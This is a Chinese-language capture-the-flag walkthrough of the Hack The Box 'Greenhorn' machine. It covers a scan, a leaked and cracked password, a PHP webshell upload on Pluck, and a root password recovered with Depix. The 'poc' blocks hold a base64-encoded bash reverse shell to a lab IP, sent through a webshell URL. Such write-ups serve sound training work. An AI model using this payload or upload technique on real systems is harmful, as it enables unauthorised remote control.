# 域渗透之treenhorn-先知社区

> **来源**: https://xz.aliyun.com/news/17682  
> **文章ID**: 17682

---

# web渗透

## 端口扫描

使用nmap进行端口探测，发现存在22，80，3000端口开放。

![image.png](images/20250408171052-5f093169-1459-1.png)

探测其具体版本信息等。

![image.png](images/20250408171054-6058fea3-1459-1.png)

访问80端口。

![image.png](images/20250408171057-61f92c3c-1459-1.png)

发现其框架为pluck4.7.18.

![image.png](images/20250408171059-6347c0dc-1459-1.png)

## 弱口令尝试

进行弱口令尝试，发现不存在弱口令。

![image.png](images/20250408171100-63e0f9e0-1459-1.png)

访问3000端口。![image.png](images/20250408171102-64ca42e7-1459-1.png)

发现存在一个gitlab。![image.png](images/20250408171104-6609bfe6-1459-1.png)

发现其存在一个/data目录。

![image.png](images/20250408171105-66d9d393-1459-1.png)

发现其存在源代码。![image.png](images/20250408171107-67d369a4-1459-1.png)

## 敏感数据泄漏

存在数据库文件，泄漏密码。

![image.png](images/20250408171109-68fbc610-1459-1.png)

## 密码解密

然后成功解出密码为iloveyou1

![image.png](images/20250408171111-6a2aa688-1459-1.png)

接着进行登录。

![image.png](images/20250408171112-6b05061e-1459-1.png)

# 漏洞利用

## 命令执行漏洞

登录之后，尝试命令执行漏洞。

![image.png](images/20250408171114-6c40dd55-1459-1.png)

谷歌搜索漏洞。

![image.png](images/20250408171116-6d2ccc53-1459-1.png)​

​

## 编写木马

![image.png](images/20250408171117-6e00b095-1459-1.png)

然后文件上传php文件。![image.png](images/20250408171119-6ee975a0-1459-1.png)

成功获取webshell

![image.png](images/20250408171120-6f8d6b6f-1459-1.png)

编写poc：

```
echo%20%22YmFzaCAtYyAiYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMzMvNDQzMyAwPiYxIgo%22%20|%20base64%20-d%20|%20bash
```

```
http://greenhorn.htb/data/modules/notevil/0xdf.php?cmd=echo%20%22YmFzaCAtYyAiYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSIK%22%20|%20base64%20-d%20|%20bash
```

```
YmFzaCAtYyAiYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMzMvNDQzMyAwPiYxIgo=

echo%20%22YmFzaCAtYyAiYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMzMvNDQzMyAwPiYxIgo%22%20%7C%20base64%20-d%20%7C%20bash
```

上传尝试，发现成功上传。

![image.png](images/20250408171121-6ffc0840-1459-1.png)

## 反弹shell

接着进行反弹shell。

![image.png](images/20250408171121-706ca580-1459-1.png)

成功获取shell。

![image.png](images/20250408171123-7158a910-1459-1.png)

## 获取webshell

然后升级shell，并成功获取user.txt文件。

![image.png](images/20250408171125-729cb811-1459-1.png)

# 内网信息收集

使用su切换。

![image.png](images/20250408171127-73aedc4f-1459-1.png)

发现存在一个PDF和一个密码重置之后的密码。

![image.png](images/20250408171129-74debab3-1459-1.png)

## Depix工具使用

## 获取图像

![image.png](images/20250408171132-76fe83e1-1459-1.png)![image.png](images/20250408171134-77f2768c-1459-1.png)

## 恢复密码

```
python depix.py -p ../download.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o ../download-notepad_Windows10_closeAndSpaced.png 
```

![image.png](images/20250408171135-788323fa-1459-1.png)

![image.png](images/20250408171136-791b8463-1459-1.png)

成功获取账号密码。

sidefromsidetheothersidesidefromsidetheothersid

然后进行切换用户。

## 获取root权限

成功获取root权限。

![image.png](images/20250408171137-79f9ac97-1459-1.png)
